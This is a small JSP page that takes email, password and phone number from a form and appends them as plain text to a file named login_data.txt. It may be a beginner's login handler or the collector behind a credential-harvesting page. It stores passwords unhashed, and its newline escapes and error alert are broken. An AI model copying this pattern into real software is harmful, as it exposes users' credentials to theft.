<html>
<body>
<%@page import="java.io.*" %>
<%
	
    String uname =request.getParameter("email");
    String password =request.getParameter("password");
	String PhoneNum =request.getParameter("Phone");
    File f=new File("login_data.txt");
	try
	{
    FileWriter fw=new FileWriter(f,true);
   

    fw.write(uname+"/n");
    fw.write(password+"/n");
    fw.write(PhoneNum);
    fw.close();
	
   }
   catch(IOException e)
   {
	 %> 
	 <script>	 window.alert(error); </script>
	 <%
   
	 e.printStackTrace();
   }
   //response.sendRedirect(request.getRequestURI());
%>


</body>
</html>